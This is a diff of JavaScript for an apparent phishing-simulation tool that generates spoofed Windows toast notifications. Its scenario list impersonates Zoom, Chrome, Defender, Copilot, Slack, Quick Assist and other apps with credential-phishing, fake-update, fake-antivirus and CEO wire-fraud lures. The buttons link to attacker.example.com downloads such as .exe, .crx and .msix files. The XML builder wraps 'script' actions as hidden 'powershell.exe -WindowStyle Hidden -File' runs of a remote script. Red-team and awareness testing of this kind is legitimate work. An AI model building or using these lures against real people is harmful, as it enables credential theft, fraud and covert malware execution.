+  {id:'Z01',payload:'URL / Protocol',num:'06',app:'Zoom',name:'Zoom Meeting In Progress',aumid:'zoom.us.Zoom Video Meetings',scenario:'default',tech:'Pretexting',title:'Meeting in progress — Board Review Q4',body:'The meeting started 8 minutes ago. The CEO is waiting for your connection.',attribution:'Zoom Video Meetings',logo:'',hasInput:false,inputType:'text',inputPlaceholder:'',selections:'',a1text:'Join now',a1type:'url',a1arg:'https://attacker.example.com/zoom/board-q4',a2:true,a2text:'Decline invitation',a2type:'dismiss',a2arg:'dismiss'},
+  {id:'Z02',payload:'URL / Protocol',num:'07',app:'Zoom',name:'Zoom Fake Security Update',aumid:'zoom.us.Zoom Video Meetings',scenario:'default',tech:'Malware Delivery',title:'Zoom — Critical Security Update Required',body:'Your current version has a critical vulnerability (CVE-2024-XXXX). Update immediately.',attribution:'',logo:'',hasInput:false,inputType:'text',inputPlaceholder:'',selections:'',a1text:'Update Zoom now',a1type:'url',a1arg:'https://attacker.example.com/zoom-update.exe',a2:true,a2text:'Dismiss',a2type:'dismiss',a2arg:'dismiss'},
+  {id:'C01',payload:'URL / Protocol',num:'08',app:'Chrome',name:'Google Session Expired',aumid:'Chrome',scenario:'default',tech:'Credential Phishing',title:'Google Chrome — Session Expired',body:'Your Google Workspace account has been signed out. Click to re-authenticate.',attribution:'Google Chrome',logo:'',hasInput:false,inputType:'text',inputPlaceholder:'',selections:'',a1text:'Sign in',a1type:'url',a1arg:'https://attacker.example.com/google-auth',a2:true,a2text:'Remind me later',a2type:'dismiss',a2arg:'dismiss'},
+  {id:'C02',payload:'URL / Protocol',num:'09',app:'Chrome',name:'Extension Blocked',aumid:'Chrome',scenario:'default',tech:'Malware Delivery',title:'Chrome — Extension Blocked by IT Policy',body:'The corporate security extension has been disabled. Reinstall it to maintain endpoint protection.',attribution:'',logo:'',hasInput:false,inputType:'text',inputPlaceholder:'',selections:'',a1text:'Reinstall extension',a1type:'url',a1arg:'https://attacker.example.com/extension.crx',a2:true,a2text:'Dismiss',a2type:'dismiss',a2arg:'dismiss'},
+  {id:'D01',payload:'URL / Protocol',num:'10',app:'Defender',name:'Ransomware Blocked',aumid:'Microsoft.SecHealthUI_8wekyb3d8bbwe!SecHealthUI',scenario:'urgent',tech:'Fake AV',title:'Windows Defender — Ransomware Blocked',body:'Lockbit.3 detected in C:\\Users\\Documents. Install emergency patch KB5041578 immediately.',attribution:'',logo:'',hasInput:false,inputType:'text',inputPlaceholder:'',selections:'',a1text:'Install patch now',a1type:'url',a1arg:'https://attacker.example.com/kb5041578.exe',a2:true,a2text:'View full report',a2type:'url',a2arg:'https://attacker.example.com/report'},
+  {id:'D02',payload:'URL / Protocol',num:'11',app:'Defender',name:'License Expired',aumid:'Microsoft.SecHealthUI_8wekyb3d8bbwe!SecHealthUI',scenario:'default',tech:'Fake Expiry',title:'Protection Disabled — Action Required',body:'Your corporate security license has expired. Your device is unprotected. Renew now.',attribution:'',logo:'',hasInput:false,inputType:'text',inputPlaceholder:'',selections:'',a1text:'Renew license',a1type:'url',a1arg:'https://attacker.example.com/renew',a2:true,a2text:'More info',a2type:'url',a2arg:'https://attacker.example.com/info'},
+  {id:'CP01',payload:'URL / Protocol',num:'12',app:'Copilot',name:'Privacy Alert',aumid:'Microsoft.Copilot_8wekyb3d8bbwe!App',scenario:'default',tech:'Pretexting',title:'Microsoft Copilot — Privacy Alert',body:'Your confidential documents were processed by an unauthorized external model.',attribution:'',logo:'',hasInput:false,inputType:'text',inputPlaceholder:'',selections:'',a1text:'Review access log',a1type:'url',a1arg:'https://attacker.example.com/privacy-review',a2:true,a2text:'Revoke permissions',a2type:'url',a2arg:'https://attacker.example.com/revoke'},
+  {id:'CP02',payload:'URL / Protocol',num:'13',app:'Copilot',name:'Data Leak Detected',aumid:'Microsoft.Copilot_8wekyb3d8bbwe!App',scenario:'urgent',tech:'Data Exfiltration Lure',title:'Microsoft Copilot — Potential Data Leak',body:"Copilot detected that your organization's data has been referenced in a public dataset.",attribution:'',logo:'',hasInput:false,inputType:'text',inputPlaceholder:'',selections:'',a1text:'Review exposure',a1type:'url',a1arg:'https://attacker.example.com/data-leak',a2:true,a2text:'Report to IT',a2type:'url',a2arg:'https://attacker.example.com/report-it'},
+  {id:'OD01',payload:'URL / Protocol',num:'14',app:'OneDrive',name:'Files Pending Deletion',aumid:'Microsoft.SkyDrive.Desktop',scenario:'default',tech:'Urgency / Phishing',title:'OneDrive — Files Pending Deletion',body:'23 files will be permanently deleted in 2 hours due to the data retention policy.',attribution:'Microsoft OneDrive',logo:'',hasInput:false,inputType:'text',inputPlaceholder:'',selections:'',a1text:'Save files',a1type:'url',a1arg:'https://attacker.example.com/onedrive-save',a2:true,a2text:'View affected files',a2type:'url',a2arg:'https://attacker.example.com/onedrive-list'},
+  {id:'O01',payload:'URL / Protocol',num:'15',app:'Office Hub',name:'M365 License Expired',aumid:'Microsoft.MicrosoftOfficeHub_8wekyb3d8bbwe!Microsoft.MicrosoftOfficeHub',scenario:'default',tech:'Credential Phishing',title:'Microsoft 365 — License Expired',body:'Your Microsoft 365 Business subscription has expired. Renew to continue.',attribution:'Microsoft Office',logo:'',hasInput:false,inputType:'text',inputPlaceholder:'',selections:'',a1text:'Renew now',a1type:'url',a1arg:'https://attacker.example.com/m365-renew',a2:true,a2text:'Contact IT',a2type:'url',a2arg:'https://attacker.example.com/it-contact'},
+  {id:'S01',payload:'URL / Protocol',num:'16',app:'Windows Store',name:'Mandatory IT Security App',aumid:'Microsoft.WindowsStore_8wekyb3d8bbwe!App',scenario:'default',tech:'Malware Delivery',title:'Microsoft Store — IT-Recommended Application',body:'IT has published "Corporate Security Agent 2.1". Mandatory installation required.',attribution:'',logo:'',hasInput:false,inputType:'text',inputPlaceholder:'',selections:'',a1text:'Install now',a1type:'url',a1arg:'https://attacker.example.com/security-agent.msix',a2:true,a2text:'Schedule',a2type:'url',a2arg:'https://attacker.example.com/schedule'},
+  {id:'QA01',payload:'URL / Protocol',num:'17',app:'Quick Assist',name:'Remote Support Request',aumid:'MicrosoftCorporationII.QuickAssist_8wekyb3d8bbwe!App',scenario:'default',tech:'Remote Access',title:'Quick Assist — Remote Support Request',body:'Technician Mark L. (IT-Helpdesk) needs remote access to complete the security update.',attribution:'',logo:'',hasInput:true,inputType:'text',inputPlaceholder:'Enter the session code...',selections:'',a1text:'Authorize connection',a1type:'url',a1arg:'https://attacker.example.com/remote-session',a2:true,a2text:'Decline',a2type:'dismiss',a2arg:'dismiss'},
+  {id:'PL01',payload:'URL / Protocol',num:'18',app:'Phone Link',name:'Unknown Device Linked',aumid:'Microsoft.YourPhone_8wekyb3d8bbwe!App',scenario:'default',tech:'Account Takeover',title:'Phone Link — New Device Linked',body:'An unknown device "Samsung SM-G998B" has been linked to your account.',attribution:'',logo:'',hasInput:false,inputType:'text',inputPlaceholder:'',selections:'',a1text:"Secure account",a1type:'url',a1arg:'https://attacker.example.com/account-recovery',a2:true,a2text:'Yes, that was me',a2type:'dismiss',a2arg:'dismiss'},
+  {id:'SL01',payload:'URL / Protocol',num:'19',app:'Slack',name:'CEO DM Fraud (BEC)',aumid:'com.squirrel.slack.slack',scenario:'default',tech:'BEC / CEO Fraud',title:'Slack · DM from James Carter (CEO)',body:"I need you to process an urgent wire transfer of $45,000. I'll explain later.",attribution:'Slack',logo:'',hasInput:false,inputType:'text',inputPlaceholder:'',selections:'',a1text:'Reply in Slack',a1type:'url',a1arg:'https://attacker.example.com/slack-dm',a2:true,a2text:'Dismiss',a2type:'dismiss',a2arg:'dismiss'},
+  {id:'SL02',payload:'URL / Protocol',num:'20',app:'Slack',name:'#security IOC Alert',aumid:'com.squirrel.slack.slack',scenario:'default',tech:'SOC Phishing',title:'#security-alerts · New IOC Confirmed',body:'Malicious hash detected on 3 endpoints. Review the updated playbook.',attribution:'',logo:'',hasInput:false,inputType:'text',inputPlaceholder:'',selections:'',a1text:'View playbook',a1type:'url',a1arg:'https://attacker.example.com/playbook-ioc',a2:true,a2text:'Open in Slack',a2type:'url',a2arg:'https://attacker.example.com/slack-channel'},
+  {id:'PM01',payload:'URL / Protocol',num:'21',app:'Proton Mail',name:'Encrypted Message',aumid:'com.squirrel.proton_mail.ProtonMail',scenario:'default',tech:'Credential Phishing',title:'Proton Mail — Encrypted Urgent Message',body:'You have an encrypted message from your attorney. Session expired — re-authenticate.',attribution:'Proton Mail',logo:'',hasInput:false,inputType:'text',inputPlaceholder:'',selections:'',a1text:'Decrypt message',a1type:'url',a1arg:'https://attacker.example.com/proton-auth',a2:true,a2text:'Dismiss',a2type:'dismiss',a2arg:'dismiss'},
+  {id:'VS01',payload:'URL / Protocol',num:'22',app:'VS Code',name:'Compromised Extension',aumid:'Microsoft.VisualStudioCode',scenario:'default',tech:'Malware Delivery',title:'VS Code — Compromised Extension Detected',body:'The "Python (ms-python)" extension contains malicious code. Remove and scan now.',attribution:'',logo:'',hasInput:false,inputType:'text',inputPlaceholder:'',selections:'',a1text:'Scan now',a1type:'url',a1arg:'https://attacker.example.com/vscode-scan',a2:true,a2text:'View extensions',a2type:'url',a2arg:'https://attacker.example.com/extensions'},
+  {id:'RD01',payload:'URL / Protocol',num:'23',app:'Remote Desktop',name:'Unauthorized RDP Session',aumid:'Microsoft.Windows.RemoteDesktop',scenario:'urgent',tech:'Lateral Movement',title:'Remote Desktop — Unauthorized Session Detected',body:'An active RDP session from 185.220.101.45 (Russia). Terminate immediately.',attribution:'',logo:'',hasInput:false,inputType:'text',inputPlaceholder:'',selections:'',a1text:'Terminate now',a1type:'url',a1arg:'https://attacker.example.com/rdp-terminate',a2:true,a2text:'View details',a2type:'url',a2arg:'https://attacker.example.com/rdp-details'},
+  {id:'WT01',payload:'Execute Script',num:'24',app:'Windows Terminal',name:'Admin Script Lure',aumid:'Microsoft.WindowsTerminal_8wekyb3d8bbwe!App',scenario:'default',tech:'Privilege Escalation',title:'Windows Terminal — Maintenance Task',body:'IT has scheduled a cache cleanup. Please run the attached script with admin privileges.',attribution:'',logo:'',hasInput:false,inputType:'text',inputPlaceholder:'',selections:'',a1text:'Run script',a1type:'script',a1arg:'https://attacker.example.com/cleanup.ps1',a2:true,a2text:'Postpone',a2type:'dismiss',a2arg:'snooze'},
+  {id:'XB01',payload:'URL / Protocol',num:'25',app:'Xbox / Gaming',name:'Microsoft Points Gift',aumid:'Microsoft.GamingApp_8wekyb3d8bbwe!Microsoft.Xbox.App',scenario:'default',tech:'Social Engineering',title:'Xbox — You received 5,000 Microsoft Points!',body:'A friend sent you a gift. Claim it before it expires (24h). Sign in to view.',attribution:'',logo:'',hasInput:false,inputType:'text',inputPlaceholder:'',selections:'',a1text:'Claim gift',a1type:'url',a1arg:'https://attacker.example.com/xbox-gift',a2:true,a2text:'Dismiss',a2type:'dismiss',a2arg:'dismiss'},
+];
+
+let custom=JSON.parse(localStorage.getItem('gt_custom')||'[]');
+let all=()=>[...SCENARIOS,...custom];
+
+// ─── STATE ───────────────────────────────────────────────
+let cur=null,inputOn=false,b2On=true,at={1:'url',2:'dismiss'},xmlDirty=false;
+let exportMode='single',uidOn=true,savedUid='';
+
+// ─── SIDEBAR ─────────────────────────────────────────────
+// ─── FILTER STATE ────────────────────────────────────────
+let activePayload   = 'All';
+let activeTechnique = 'All';
+let filterExpanded  = false;
+
+const PAYLOAD_META = {
+  'All':             {color:'var(--text2)', bg:'transparent',           border:'var(--border2)'},
+  'URL / Protocol':  {color:'#7a8faf',     bg:'rgba(122,143,175,.1)',    border:'rgba(122,143,175,.25)'},
+  'Execute Script':  {color:'var(--red)',   bg:'rgba(247,95,107,.1)',    border:'rgba(247,95,107,.25)'},
+};
+
+// Exact techniques from the scenario matrix (deduplicated, canonical)
+const TECHNIQUES = [
+  'Impersonation',
+  'Credential Phishing',
+  'Malware Delivery',
+  'Vishing',
+  'SOC Phishing',
+  'Lateral Movement',
+  'Vishing / Deepfake',
+  'Pretexting',
+  'Fake AV',
+  'Fake Expiry',
+  'Data Exfiltration Lure',
+  'Urgency / Phishing',
+  'BEC / CEO Fraud',
+  'Remote Access',
+  'Account Takeover',
+  'Privilege Escalation',
+  'Social Engineering',
+];
+
+function getPayloadColor(p){ return PAYLOAD_META[p]||PAYLOAD_META['All']; }
+
+function getScenarioPayload(s){
+  if(s.a1type==='script'||(s.a2type==='script'&&s.a2)) return 'Execute Script';
+  return 'URL / Protocol';
+}
+
+function setPayloadFilter(p){
+  activePayload=p;
+  renderFilterChips();
+  renderSidebar(document.getElementById('sbSearch').value);
+}
+
+function setTechFilter(t){
+  activeTechnique=t;
+  renderFilterChips();
+  renderSidebar(document.getElementById('sbSearch').value);
+}
+
+function toggleFilterExpand(){
+  filterExpanded=!filterExpanded;
+  renderFilterChips();
+}
+
+function buildPayloadBadge(p){
+  const m=getPayloadColor(p);
+  return `<span style="font-size:.55rem;padding:1px 5px;border-radius:3px;background:${m.bg};color:${m.color};border:1px solid ${m.border};white-space:nowrap;font-family:'JetBrains Mono',monospace">${p}</span>`;
+}
+
+function renderFilterChips(){
+  const wrap=document.getElementById('payloadFilters');
+  if(!wrap)return;
+
+  const hasFilter = activePayload!=='All' || activeTechnique!=='All';
+  const activeLabel = [
+    activePayload!=='All' ? activePayload : null,
+    activeTechnique!=='All' ? activeTechnique : null,
+  ].filter(Boolean).join(' · ') || 'All';
+
+  if(!filterExpanded){
+    // Collapsed: single row showing active filter + toggle button
+    wrap.innerHTML = `<div style="display:flex;align-items:center;gap:6px;padding:5px 8px;width:100%">
+      <span style="font-size:.6rem;font-weight:600;color:var(--text3);text-transform:uppercase;letter-spacing:.8px;white-space:nowrap">Filter</span>
+      <span style="flex:1;font-size:.65rem;color:${hasFilter?'var(--accent)':'var(--text2)'};font-weight:${hasFilter?'600':'400'}">${activeLabel}</span>
+      ${hasFilter?`<div onclick="activePayload='All';activeTechnique='All';renderFilterChips();renderSidebar(document.getElementById('sbSearch').value)"
+        style="font-size:.58rem;color:var(--red);cursor:pointer;padding:1px 5px;border-radius:3px;border:1px solid rgba(247,95,107,.2);background:rgba(247,95,107,.05)" title="Clear filters">✕</div>`:''}
+      <div onclick="toggleFilterExpand()" style="font-size:.6rem;color:var(--text2);cursor:pointer;padding:2px 7px;border-radius:4px;border:1px solid var(--border2);background:var(--panel2);white-space:nowrap">
+        ${filterExpanded?'▲ Hide':'▼ Filters'}
+      </div>
+    </div>`;
+    return;
+  }
+
+  // Expanded: full filter UI
+  const payloadRow = Object.entries(PAYLOAD_META).map(([p,m])=>{
+    const active = activePayload===p;
+    return `<div onclick="setPayloadFilter('${p}')"
+      style="font-size:.6rem;font-weight:${active?'600':'500'};padding:3px 8px;border-radius:8px;
+      border:1px solid ${active?m.border:'var(--border2)'};background:${active?m.bg:'transparent'};
+      color:${active?m.color:'var(--text2)'};cursor:pointer;transition:all .15s;white-space:nowrap;font-family:'Inter',sans-serif">${p}</div>`;
+  }).join('');
+
+  const techRow = [
+    {label:'All', active: activeTechnique==='All', onclick:"setTechFilter('All')"},
+    ...TECHNIQUES.map(t=>({label:t, active:activeTechnique===t, onclick:`setTechFilter('${t.replace(/'/g,"\\'")}')` }))
+  ].map(({label,active,onclick})=>`<div onclick="${onclick}"
+    style="font-size:.6rem;font-weight:${active?'600':'500'};padding:3px 8px;border-radius:8px;
+    border:1px solid ${active?'var(--purple)':'var(--border2)'};
+    background:${active?'rgba(167,139,250,.12)':'transparent'};
+    color:${active?'var(--purple)':'var(--text2)'};cursor:pointer;transition:all .15s;white-space:nowrap;font-family:'Inter',sans-serif">${label}</div>`).join('');
+
+  wrap.innerHTML = `
+    <div style="padding:6px 8px 4px;border-bottom:1px solid var(--border)">
+      <div style="display:flex;align-items:center;justify-content:space-between;margin-bottom:5px">
+        <span style="font-size:.6rem;font-weight:700;color:var(--text2);text-transform:uppercase;letter-spacing:.8px">Payload Type</span>
+      </div>
+      <div style="display:flex;gap:4px;flex-wrap:wrap">${payloadRow}</div>
+    </div>
+    <div style="padding:5px 8px 6px">
+      <div style="display:flex;align-items:center;justify-content:space-between;margin-bottom:5px">
+        <span style="font-size:.6rem;font-weight:700;color:var(--text2);text-transform:uppercase;letter-spacing:.8px">Technique</span>
+        <div onclick="toggleFilterExpand()" style="font-size:.58rem;color:var(--text3);cursor:pointer;padding:1px 6px;border-radius:3px;border:1px solid var(--border2)">▲ Collapse</div>
+      </div>
+      <div style="display:flex;gap:4px;flex-wrap:wrap">${techRow}</div>
+    </div>`;
+}
+
+// keep backward-compat alias
+function renderPayloadFilters(){ renderFilterChips(); }
+
+function loadById(id){
+  const s=all().find(x=>x.id===id);
+  if(s) load(s);
+}
+
+// track which groups are manually toggled
+const groupOverrides = {};
+function safeKey(app){ return app.replace(/[^a-z0-9]/gi,'_'); }
+
+function toggleGroup(app) {
+  const k = safeKey(app);
+  const body = document.getElementById('grp-' + k);
+  if (!body) return;
+  const isOpen = body.style.display !== 'none';
+  groupOverrides[app] = !isOpen;
+  body.style.display = isOpen ? 'none' : '';
+  const chevron = document.getElementById('chv-' + k);
+  if (chevron) chevron.innerHTML = isOpen ? chevronSvg(false) : chevronSvg(true);
+}
+
+function expandAll() {
+  Object.keys(groupOverrides).forEach(k => delete groupOverrides[k]);
+  document.querySelectorAll('[id^="grp-"]').forEach(el => el.style.display = '');
+  document.querySelectorAll('[id^="chv-"]').forEach(el => el.innerHTML = chevronSvg(true));
+}
+function collapseAll() {
+  document.querySelectorAll('[id^="grp-"]').forEach(el => {
+    groupOverrides[el.dataset.app] = false;
+    el.style.display = 'none';
+  });
+  document.querySelectorAll('[id^="chv-"]').forEach(el => el.innerHTML = chevronSvg(false));
+}
+
+function chevronSvg(open){
+  return open
+    ? `<svg width="8" height="8" viewBox="0 0 8 8" fill="none"><path d="M2 3l2 2 2-2" stroke="currentColor" stroke-width="1.2" stroke-linecap="round" stroke-linejoin="round"/></svg>`
+    : `<svg width="8" height="8" viewBox="0 0 8 8" fill="none"><path d="M3 2l2 2-2 2" stroke="currentColor" stroke-width="1.2" stroke-linecap="round" stroke-linejoin="round"/></svg>`;
+}
+
+function renderSidebar(q=''){
+  let list=all();
+  if(q) list=list.filter(s=>[s.name,s.app,s.tech,s.num,s.title||''].some(f=>f.toLowerCase().includes(q.toLowerCase())));
+  if(activePayload!=='All') list=list.filter(s=>getScenarioPayload(s)===activePayload);
+  if(activeTechnique!=='All') list=list.filter(s=>s.tech===activeTechnique);
+  const groups={};
+  list.forEach(s=>(groups[s.app]=groups[s.app]||[]).push(s));
+
+  // active app = app of currently loaded scenario
+  const activeApp = cur ? cur.app : null;
+  // if searching or filtering, expand all
+  const forceAll = q || activePayload !== 'All' || activeTechnique !== 'All' || filterExpanded;
+
+  const html = Object.entries(groups).map(([app, items]) => {
+    const hasActive = items.some(s => cur && s.id === cur.id);
+    // On mobile: all collapsed by default, only active group opens
+    // On desktop: active group opens, others collapsed
+    const defaultOpen = forceAll || hasActive;
+    const _mob = window.innerWidth <= 768;
+    const isOpen = groupOverrides[app] !== undefined ? groupOverrides[app] : (forceAll ? true : (_mob ? false : hasActive));
+    const chevron = isOpen ? '▾' : '▸';
+    const bodyDisplay = isOpen ? '' : 'none';
+    const itemsHtml = items.map(s => {
+      const p = getScenarioPayload(s);
+      return `<div class="sb-item${cur&&cur.id===s.id?' active':''}" id="si-${s.id}" onclick="loadById('${s.id}')">
+        <div style="display:flex;align-items:center;justify-content:space-between;margin-bottom:2px">
+          <div class="sb-num">#${s.num}${s._custom?'  <span style="color:var(--red);font-size:.5rem">CUSTOM</span>':''}</div>
+          ${buildPayloadBadge(p)}
+        </div>
+        <div class="sb-name">${s.name}</div>
+        <div class="sb-meta">${s.tech}</div>
+      </div>`;
+    }).join('');
+
+    const k = safeKey(app);
+    return `<div class="sb-group-wrap">
+      <div class="sb-group" onclick="toggleGroup('${app.replace(/\\/g,'\\\\').replace(/'/g,"\\'")}')">
+        <span style="display:flex;align-items:center;gap:5px">
+          <span id="chv-${k}" style="color:var(--sub);width:10px;height:10px;display:inline-flex;align-items:center">${isOpen ? chevronSvg(true) : chevronSvg(false)}</span>
+          ${app}
+        </span>
+        <span style="color:var(--muted);font-size:.52rem">${items.length}</span>
+      </div>
+      <div id="grp-${k}" data-app="${app}" style="display:${bodyDisplay}">${itemsHtml}</div>
+    </div>`;
+  }).join('');
+
+  document.getElementById('sbList').innerHTML = html || `<div style="padding:16px;font-size:.7rem;color:var(--muted);text-align:center">No scenarios match</div>`;
+}
+
+// ─── LOAD ────────────────────────────────────────────────
+function load(s){
+  if(!s)return;
+  cur=JSON.parse(JSON.stringify(s));
+  set('f-aumid',s.aumid);set('f-scenario',s.scenario);set('f-label',s.name);
+  set('f-title',s.title);set('f-body',s.body);set('f-attr',s.attribution);set('f-logo',s.logo);
+  set('f-itype',s.inputType);set('f-iph',s.inputPlaceholder);set('f-sels',s.selections);
+  set('f-a1t',s.a1text);set('f-a1u',s.a1arg);
+  set('f-a2t',s.a2text);set('f-a2u',s.a2arg);
+  const payloadEl=document.getElementById('f-payload');if(payloadEl)payloadEl.value=s.payload||getScenarioPayload(s);
+  inputOn=s.hasInput||false; b2On=s.a2!==false;
+  at[1]=s.a1type||'url'; at[2]=s.a2type||'dismiss';
+  updInputToggle();updB2Toggle();updAtUI(1,at[1]);updAtUI(2,at[2]);
+  Object.keys(groupOverrides).forEach(k => delete groupOverrides[k]);
+  renderSidebar(document.getElementById('sbSearch').value);
+  updPreview();xmlDirty=false;updXml();gen();
+}
+function set(id,v){const el=document.getElementById(id);if(el)el.value=v||'';}
+
+// ─── SYNC ────────────────────────────────────────────────
+function sync(){
+  if(!cur)return;
+  cur.aumid=v('f-aumid');cur.scenario=v('f-scenario');cur.name=v('f-label')||cur.name;
+  cur.title=v('f-title');cur.body=v('f-body');cur.attribution=v('f-attr');cur.logo=v('f-logo');
+  cur.inputType=v('f-itype');cur.inputPlaceholder=v('f-iph');cur.selections=v('f-sels');
+  cur.a1text=v('f-a1t');cur.a1arg=v('f-a1u');cur.a2text=v('f-a2t');cur.a2arg=v('f-a2u');
+  cur.hasInput=inputOn; cur.a2=b2On;
+  cur.payload=v('f-payload')||cur.payload||getScenarioPayload(cur);
+  document.getElementById('selOpts').style.display=cur.inputType==='selection'?'':'none';
+  updPreview();xmlDirty=false;updXml();gen();
+}
+function v(id){const el=document.getElementById(id);return el?el.value:'';}
+
+function syncPayload(){
+  if(!cur)return;
+  cur.payload=v('f-payload');
+  // if custom scenario, persist the change
+  const ci=custom.findIndex(x=>x.id===cur.id);
+  if(ci>-1){custom[ci].payload=cur.payload;saveCustom();}
+  renderSidebar(document.getElementById('sbSearch').value);
+}
+
+// ─── PREVIEW ─────────────────────────────────────────────
+function updPreview(){
+  if(!cur)return;
+  const s=cur.scenario||'default';
+  const isCall=s==='incomingCall';
+  const toast=document.getElementById('toastW11');
+  toast.className='toast-w11'+(s==='urgent'?' is-urgent':s==='incomingCall'?' is-incoming':'');
+
+  document.getElementById('tw-standard').style.display=isCall?'none':'';
+  document.getElementById('tw-call').style.display=isCall?'':'none';
+
+  if(isCall){
+    document.getElementById('tw-call-title').textContent=cur.title||'Caller Name';
+    document.getElementById('tw-call-sub').textContent=cur.body||'Incoming call';
+    document.getElementById('tw-call-ans').textContent=cur.a1text||'Answer';
+    document.getElementById('tw-call-dec').textContent=(b2On&&cur.a2text)||'Decline';
+    // avatar initials
+    const name=cur.title||'?';
+    const init=name.split(/[\s—-]+/).map(w=>w[0]).filter(Boolean).slice(0,2).join('').toUpperCase();
+    document.getElementById('tw-avatar').textContent=init||'?';
+  } else {
+    // app icon
+    document.getElementById('tw-icon').innerHTML=iconSvg(cur.app);
+    document.getElementById('tw-appname').textContent=getIcon(cur.app).label;
+    // live clock
+    document.getElementById('tw-time').textContent=new Date().toLocaleTimeString([],{hour:'2-digit',minute:'2-digit'});
+    document.getElementById('tw-title').textContent=cur.title||'Title';
+    document.getElementById('tw-body').textContent=cur.body||'Body text';
+    // attribution
+    const atEl=document.getElementById('tw-attr');
+    if(cur.attribution){atEl.style.display='';atEl.textContent=cur.attribution;}
+    else atEl.style.display='none';
+    // input
+    const inEl=document.getElementById('tw-input');
+    const selEl=document.getElementById('tw-sel');
+    if(inputOn){
+      if(cur.inputType==='text'){
+        inEl.style.display='flex';
+        document.getElementById('tw-input-ph').textContent=cur.inputPlaceholder||'Enter text…';
+        selEl.style.display='none';
+      } else {
+        selEl.style.display='flex';
+        const opts=(cur.selections||'').split('\n').filter(Boolean);
+        document.getElementById('tw-sel-val').textContent=opts.length?(opts[0].split('|')[1]||opts[0]):'Select option';
+        inEl.style.display='none';
+      }
+    } else { inEl.style.display='none'; selEl.style.display='none'; }
+    // buttons
+    const btnsEl=document.getElementById('tw-btns');
+    const b1=cur.a1text||'Action';
+    const b2=(b2On&&cur.a2text)||'';
+    if(!b1&&!b2){btnsEl.style.display='none';}
+    else {
+      btnsEl.style.display='flex';
+      btnsEl.innerHTML=`<div class="tw-btn">${b1}</div>`+(b2?`<div class="tw-btn">${b2}</div>`:'');
+    }
+  }
+}
+
+// ─── TOGGLES ─────────────────────────────────────────────
+function toggleInput(){
+  inputOn=!inputOn;
+  updInputToggle();
+  if(cur)cur.hasInput=inputOn;
+  sync();
+}
+function updInputToggle(){
+  document.getElementById('inputSw').className='sw'+(inputOn?' on':'');
+  document.getElementById('inputLbl').textContent=inputOn?'on':'off';
+  document.getElementById('inputFields').style.display=inputOn?'flex':'none';
+  if(inputOn)document.getElementById('selOpts').style.display=v('f-itype')==='selection'?'':'none';
+}
+function toggleB2(){
+  b2On=!b2On;
+  document.getElementById('b2sw').className='sw'+(b2On?' on':'');
+  document.getElementById('b2lbl').textContent=b2On?'on':'off';
+  document.getElementById('b2fields').style.display=b2On?'flex':'none';
+  if(cur)cur.a2=b2On;
+  sync();
+}
+function updB2Toggle(){
+  document.getElementById('b2sw').className='sw'+(b2On?' on':'');
+  document.getElementById('b2lbl').textContent=b2On?'on':'off';
+  document.getElementById('b2fields').style.display=b2On?'flex':'none';
+}
+function setAt(btn,type,el){
+  // Block unsupported types
+  const support = cur ? getActionSupport(cur.app) : {url:true,protocol:true,script:true,dismiss:true};
+  if(support[type]===false){ toast(`⚠ ${type} not supported for ${cur?cur.app:'this app'}`,true); return; }
+  at[btn]=type;
+  el.closest('.pill-row').querySelectorAll('.pill').forEach(p=>p.classList.remove('on'));
+  el.classList.add('on');
+  updAtUI(btn,type);
+  if(cur)cur['a'+btn+'type']=type;
+  sync();
+}
+function updAtUI(btn,type){
+  const support = cur ? getActionSupport(cur.app) : {url:true,protocol:true,script:true,dismiss:true};
+  document.getElementById(`p${btn}row`).querySelectorAll('.pill').forEach(p=>{
+    const ptype = p.dataset.type;
+    const isActive = ptype===type;
+    const isSupported = support[ptype]!==false;
+    p.classList.toggle('on', isActive);
+    p.style.opacity = isSupported ? '1' : '.3';
+    p.style.cursor = isSupported ? 'pointer' : 'not-allowed';
+    p.title = isSupported ? '' : `Not supported for ${cur?cur.app:'this app'}`;
+  });
+  const lbls={url:'Redirect URL (https://)',protocol:'Protocol URI (app://...)',script:'Script / Executable path',dismiss:'No argument needed'};
+  const hints={url:'Opens in default browser via protocol activation',protocol:cur?getActionSupport(cur.app).note||'Custom URI scheme':'Custom URI scheme',script:'Wraps in powershell.exe -WindowStyle Hidden -File',dismiss:'System dismiss action'};
+  document.getElementById(`a${btn}lbl`).textContent=lbls[type]||'Argument';
+  const hint=document.getElementById(`a${btn}hint`);
+  if(hint) hint.textContent=hints[type]||'';
+  const inp=document.getElementById(`f-a${btn}u`);
+  inp.disabled=type==='dismiss'; inp.style.opacity=type==='dismiss'?'.3':'1';
+}
+
+// ─── XML ─────────────────────────────────────────────────
+function buildXml(s){
+  let x=`<toast scenario="${s.scenario||'default'}">\n  <visual>\n    <binding template="ToastGeneric">\n      <text>${ex(s.title)}</text>\n      <text>${ex(s.body)}</text>`;
+  if(s.attribution)x+=`\n      <text placement="attribution">${ex(s.attribution)}</text>`;
+  if(s.logo)x+=`\n      <image placement="appLogoOverride" hint-crop="circle"\n             src="${ex(s.logo)}"/>`;
+  x+=`\n    </binding>\n  </visual>`;
+  const hasA=inputOn||s.a1text||(b2On&&s.a2text);
+  if(hasA){
+    x+=`\n  <actions>`;
+    if(inputOn){
+      if(s.inputType==='selection'){
+        x+=`\n    <input id="sel" type="selection" defaultInput="opt0" title="${ex(s.inputPlaceholder||'')}">\n`;
+        (s.selections||'').split('\n').filter(Boolean).forEach((o,i)=>{const p=o.split('|');x+=`      <selection id="${ex(p[0]||'opt'+i)}" content="${ex(p[1]||o)}"/>\n`;});
+        x+=`    </input>`;
+      } else x+=`\n    <input id="msg" type="text" placeHolderContent="${ex(s.inputPlaceholder||'')}"/>`;
+    }
+    if(s.a1text)x+=actXml(s.a1text,at[1],s.a1arg,inputOn&&s.inputType==='text');
+    if(b2On&&s.a2text)x+=actXml(s.a2text,at[2],s.a2arg,false);
+    x+=`\n  </actions>`;
+  }
+  return x+`\n</toast>`;
+}
+function actXml(lbl,type,arg,hi){
+  const hint=hi?' hint-inputId="msg"':'';
+  if(type==='dismiss')return`\n    <action content="${ex(lbl)}"\n            activationType="system"\n            arguments="dismiss"/>`;
+  if(type==='script') return`\n    <action content="${ex(lbl)}"\n            activationType="protocol"\n            arguments="powershell.exe -WindowStyle Hidden -File ${ex(arg)}"${hint}/>`;
+  return`\n    <action content="${ex(lbl)}"\n            activationType="protocol"\n            arguments="${ex(arg)}"${hint}/>`;
+}
+function ex(s){return String(s||'').replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;').replace(/"/g,'&quot;');}
+function updXml(){if(!cur||xmlDirty)return;document.getElementById('xmlEd').value=buildXml(cur);}
